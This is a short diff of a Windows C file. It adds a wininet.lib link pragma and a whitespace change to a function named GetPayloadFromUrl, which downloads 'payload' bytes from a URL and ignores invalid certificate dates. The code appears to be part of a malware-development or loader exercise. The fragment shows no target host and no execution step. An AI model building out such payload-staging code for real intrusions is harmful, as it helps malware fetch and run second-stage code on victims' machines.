@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <Windows.h>
 #include <wininet.h>
+#pragma comment(lib,"wininet.lib")
 
 BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
 
@@ -20,7 +21,7 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
 		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
 		bSTATE = FALSE; goto _EndOfFunction;
 	}
-
+	
 	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
 	if (hInternetFile == NULL) {
 		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
